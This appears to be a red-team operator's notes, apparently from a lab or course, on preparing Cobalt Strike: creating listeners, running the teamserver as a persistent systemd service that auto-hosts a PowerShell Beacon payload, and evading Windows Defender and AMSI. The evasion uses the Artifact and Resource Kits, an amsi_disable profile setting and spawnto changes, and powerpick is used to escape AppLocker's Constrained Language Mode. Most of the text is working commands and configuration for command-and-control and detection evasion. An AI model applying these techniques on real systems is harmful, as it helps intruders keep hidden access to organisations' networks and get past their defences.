## These are the steps I check before to deep dive into the AD. 
This implies to create listeners, to run teamserver as a service, to check Win Defender and AppLocker and so on..

## 1) Listeners
Let's start creating at least one listner for each tipe Cobalt Strike permits you.
In the end I will have at least a:
**DNS**
**HTTP**
**SMB**
**TCP**
**TCP-LOCAL**

**Important!** 
- **For DNS listener**, this requires we create one or more DNS records for a domain that the team server will be authoritative for. 
- In the case of exampledomain.com, I have setup the following:
  ```
  @	   A	10.10.5.50
  ns1  A  10.10.5.50
  pics NS ns1.exampledomain.com.
  ```
  We can test the records by performing an arbitrary lookup.  The team server's default response is 0.0.0.0.

- **For SMB listener**, they are very simple as they only have a single option - the named pipe name.  The default is ```msagent_##``` (where ## is random hex), but you can specify anything you want. A Beacon SMB payload will start a new named pipe server with this name and listen for an incoming connection.  This named pipe is available both locally and remotely.
Since this default pipe name is quite well signatured, a good strategy is to emulate names known to be used by common applications or Windows itself. 
Use ```PS C:\> ls \\.\pipe\``` to list all currently listening pipes for inspiration, take one and use it changing the last, let's say, 4 letters/numbers and choosing them randomly.
  
- **For TCP listener**, A Beacon TCP payload will bind and listen on the specified port number. You may also specify whether it will bind to only the localhost (**TCP-LOCAL**), otherwise it will bind to all interfaces (0.0.0.0).

## 2) Teamserver As A Service
Running the team server as a service allows it to start automatically when the VM starts up, which obviously saves us having to SSH in each time and start it manually.  This can be done with a _systemd_ unit file.
- Create the file in /etc/systemd/system.
- Then paste the following content:
  ```
  [Unit]
  Description=Cobalt Strike Team Server
  After=network.target
  StartLimitIntervalSec=0

  [Service]
  Type=simple
  Restart=always
  RestartSec=1
  User=root
  WorkingDirectory=/home/attacker/cobaltstrike
  ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

  [Install]
  WantedBy=multi-user.target
  ```
- Next, reload the systemd manager and check the status of the service.  It will be inactive/dead.
  ```
  attacker@ubuntu ~> sudo systemctl daemon-reload
  attacker@ubuntu ~> sudo systemctl status teamserver.service
  ```
- Start the service and check its status again.
  ```
  attacker@ubuntu ~> sudo systemctl start teamserver.service
  attacker@ubuntu ~> sudo systemctl status teamserver.service
  ```
- The service should be active/running and you will see the typical console output from the team server. 
  Now that we know the service is working, we can tell it to start on boot.
  ``` 
  attacker@ubuntu ~> sudo systemctl enable teamserver.service
  ```
  When the team server starts the listeners we had running are started, BUT any hosted files we had (e.g. via the scripted web delivery) will not be.  
  This presents a problem for these persistence mechanisms, as they're relying on a hosted payload being present.  
  The hosted payload must be available before persistence tasks are triggered for them to be of any use. 
  In order to achieve this we can use a **headless Cobalt Strike client** via the ```agscript``` utility, to execute an aggressor script on launch. 
  
  Begin by creating host_payloads.cna.
  ```
  attacker@ubuntu ~/cobaltstrike> vim host_payloads.cna
  ```
  And paste this into it:
  ```
  # Connected and ready
  on ready {

   # Generate payload
   $payload = artifact_payload("http", "powershell", "x64");

   # Host payload
   site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
  }
  ```
  we can now test the script:
  ```
  attacker@ubuntu ~/cobaltstrike> ./agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna
  ```
  If it works you will see the associated events in the Event Log and the payload will also be hosted.
  We can add this to our existing start up service by including a _ExecStartPost_ line.
  ```
  ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
  ```
## 3) Windows Defender
  You could find yourself in the situation that you can access to the File Server, but you can't _PsExec_ to it because the service binary payload is   being detected by Defender.
  Error number **225** show this
  ```
  PS C:\Users\Attacker> net helpmsg 225
  Operation did not complete successfully because the file contains a virus or potentially unwanted software.
  ```
  Like many AV products, Defender has a database of definitions from which it can detect "known bad" very quickly.
  For this reason we should change those "bad segments". 
  Artifact kits helps us doing it. 
  ### On-Disk (EXE files)
  The alert that Defender produces is tagged with ```file:```, indicating that something malicious was detected on disk.
  
  We can use a tool like **ThreatCheck** to (roughly) identify which part of a file Defender dislikes. It achieves this by splitting the file into chunks, writing them into C:\Temp and triggering a manual scan. It will attempt to find the single smallest piece that will trigger a positive detection.
  ```src-main/main.c``` is the entry point **for the EXE artifacts**.  It does nothing more than run a function called _start_ and then just loops to prevent the process from closing.
  One of the bypass strategies included in the kit is called **bypass-pipe**.
  After having applied this strategy, since the Artifact Kit is designed to be built on Linux via the included ```build.sh``` script, it shopuld be run with the following parameters (it's just an example, use those you need specifically)
  ```./build.sh pipe VirtualAlloc 277492 5 false false /path/to/folder/cobaltstrike/artifacts```
  This will build each variant of the EXE and DLL - staged, stageless, 32, and 64-bit.  
  It will also produce an _artifact.cna_ file that we need to load into the Cobalt Strike UI.  
  Go to ```Cobalt Strike > Script Manager > Load``` and select the CNA file in your output directory.  
  Any DLL and EXE payloads that you generate from hereon will use those new artifacts.  
  Use ```Payloads > Windows Stageless Generate All Payloads``` to replace all of your payloads in C:\Payloads.
  
  **TIP**: I always use another directory, (i.e Payloads2 in order to store the new payloads and leave the older in the Payload folder for any other case or for double checking reason)
  
  ### On-Memory (PS1 files)
  The alert that Defender produces is tagged with _amsi:_ rather than _file:_, indicating that something malicious was detected _in memory_.
  Even though this is in-memory, the detections are still based on "known bad" signatures. 
  PowerShell files are a little easier to analyse compared to binary files - scanning it with ThreatCheck and the -e AMSI parameter, we see the bad strings.
  Where the Artifact Kit was used to modify the binary (EXE & DLL) payloads, the Resource Kit is used to modify the script-based payloads including the PowerShell, Python, HTA and VBA templates.
  The Resource Kit can be found in ```\cobaltstrike\arsenal-kit\kits\resource```
  Using different variable names ```$zz``` in place of ```$x``` and ```$v_code``` in place of ```$var_code``` will bypass Defender.

  The Beacon payload spawned powershell.exe and attempted to load PowerView.ps1 into it.  This was detected by AMSI and killed.  Defender also goes one step further and kills the process that spawned it (our Beacon), which is why we immediately lose the link to it.
  The same could happen using powerpick or execute -assembly.
  To avoid it:
  SSH into the team server and open the profile you're using in a text editor (for me, that's webbug.profile).
  ```
  vim c2-profiles/normal/webbug.profile
  ```
  Right above the http-get block, add the following:
  ```
    post-ex {
            set amsi_disable "true";
    }
  ```
  After modifying a profile, it's always a good idea to check it with c2lint to ensure you didn't break anything.
  ```
  ./c2lint c2-profiles/normal/webbug.profile
  ```
  _amsi_disable_ only applies to **powerpick, execute-assembly and psinject**.  It does not apply to the **powershell command.**
  
  However, It could still happen that your Beacon probably still dies shortly thereafter. This brings us to _behavioural detections_.
  
  The Beacon usually runs on the file server inside the **rundll32** process.
  rundll32 being the default "spawnto" for Cobalt Strike has been a thing for a long time and is now a common point of detection.  
  The service binary payload used by psexec also uses this by default, which is why you see those Beacons running as rundll32.exe.
  The process used for post-ex commands and psexec can be changed on the fly in the CS GUI. To change the post-ex process, use the spawnto command.  x86 and x64 must be specified individually and environment variables can also be used.
  ```
  beacon> spawnto x64 %windir%\sysnative\dllhost.exe
  beacon> spawnto x86 %windir%\syswow64\dllhost.exe
  ```
  The default spawnto can be changed inside Malleable C2 by including the spawnto_x64 and spawnto_x86 directives inside the post-ex block.
  ```
  post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
  }
  ```
## 4) AppLocker
Known colloquially as LOLBAS, these are executables and scripts that come as part of Windows but allow for arbitrary code execution.  They allow us to bypass AppLocker, because they're allowed to execute under the normal allow criteria - they exist in trusted paths (C:\Windows and C:\Program Files) and may also be digitally signed by Microsoft.
If you can find an AppLocker bypass to execute arbitrary code, you can also break out of PowerShell Constrained Language Mode by using an unmanaged   PowerShell runspace. If you have a Beacon running on a target, this is just what powerpick does.
```
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
```
  
  
